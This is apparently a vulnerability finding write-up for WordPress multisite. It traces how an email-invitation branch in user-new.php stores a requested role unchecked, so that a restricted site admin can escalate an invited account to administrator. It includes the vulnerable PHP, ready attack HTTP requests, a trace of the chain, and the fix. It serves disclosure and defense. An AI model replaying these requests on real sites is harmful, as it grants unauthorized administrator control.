# Attack scenario: role injection via inconsistent `wp_ensure_editable_role` (FINDINGS #4)

Confirmed finding `wp-admin/user-new.php:100`. Full source→sink chain verified by
reading real code (WP 7.0.2). Conditional privilege escalation on multisite with a
filtered `editable_roles`.

## Threat model
- **Attacker:** authenticated multisite site admin, or a delegated/restricted role
  with `create_users`+`promote_users` whose `editable_roles` is filtered to EXCLUDE
  `administrator` (multi-tenant / membership / "site manager" plugins).
- **Goal:** grant `administrator` (forbidden by their editable_roles) to an account
  they control.
- **Stock caveat:** in stock, a site admin's editable_roles already includes
  administrator → `wp_ensure_editable_role` is a no-op → NO boundary crossed. The
  escalation exists only where a filter restricts the attacker.

## Step 1 — submit the invite with an out-of-policy role
Vulnerable branch (`user-new.php`, the email-invitation `else`, ~line 92-105):
```php
} else {
    $newuser_key = wp_generate_password( 20, false );
    add_option( 'new_user_' . $newuser_key, array(
        'user_id' => $user_id,
        'email'   => $user_details->user_email,
        'role'    => $_REQUEST['role'],   // ← stored verbatim, NO wp_ensure_editable_role()
    ) );
    $roles = get_editable_roles();
    $role  = $roles[ $_REQUEST['role'] ];  // ← AFTER the store; email only; bad role = warning, not wp_die
```
Guarded sibling (line 73): `wp_ensure_editable_role( $_REQUEST['role'] );`

```http
POST /wp-admin/network/user-new.php HTTP/1.1
Host: victim.network.example
Cookie: wordpress_logged_in_<hash>=<restricted-admin session>
Content-Type: application/x-www-form-urlencoded

action=adduser&_wpnonce_add-user=<nonce from form>&_wp_http_referer=%2Fwp-admin%2Fnetwork%2Fuser-new.php&email=attacker-alt%40example.com&role=administrator
```
(omit `noconfirmation` — that routes to the guarded branch). Gate passed:
`current_user_can('promote_user',$target)` — coarse, role-agnostic.

## Step 2 — second-order trigger (attacker controls the invited email → clicks the link)
`maybe_add_existing_user_to_blog()` (`ms-functions.php`, runs on every request):
```php
if ( ! str_contains( $_SERVER['REQUEST_URI'], '/newbloguser/' ) ) return;
$key = array_pop( explode('/', $_SERVER['REQUEST_URI']) );
$details = get_option( 'new_user_' . $key );        // reads the tainted role
add_existing_user_to_blog( $details );
```
```http
GET /newbloguser/<key-from-email>/ HTTP/1.1
Host: victim.network.example
```

## Step 3 — applied with no re-check
```php
function add_user_to_blog( $blog_id, $user_id, $role ) {
    apply_filters( 'can_add_user_to_blog', true, ... );  // default TRUE
    $user->set_role( $role );   // 'administrator' applied, no cap/editable-role re-check
}
```

## Traced chain
```
$_REQUEST['role']=administrator  [POST, restricted site admin]
 └ user-new.php:100 add_option('new_user_{key}',role)   ← NO wp_ensure_editable_role (BUG)
   └ [DB] ── second order ──> GET /newbloguser/{key}/
     └ maybe_add_existing_user_to_blog -> add_existing_user_to_blog
       └ add_user_to_blog -> $user->set_role('administrator')   ← escalation
```

## Severity (honest) & fix
Real, unconditional *inconsistency* (2/3 sinks guarded); **conditional escalation**
(multisite + filtered editable_roles); defense-in-depth in stock. Not RCE. **Fix:**
add `wp_ensure_editable_role( $_REQUEST['role'] );` at the top of the
email-invitation branch, matching its two siblings.

## How XERJ surfaced it
The three role-sinks live in one file but different branches; XERJ's `wpsinks`
returns "every `add_option`/`add_existing_user_to_blog` carrying a role arg" as one
result set, handing the reviewer the three siblings to compare. The structural
authz graph passed the file (a `promote_user` cap check IS present); a blind
full-context scan splits the storage branch from the `ms-functions.php` confirmation
sink across chunks. Only the graph-narrowed per-file read that compares siblings
catches a *missing sibling guard*.
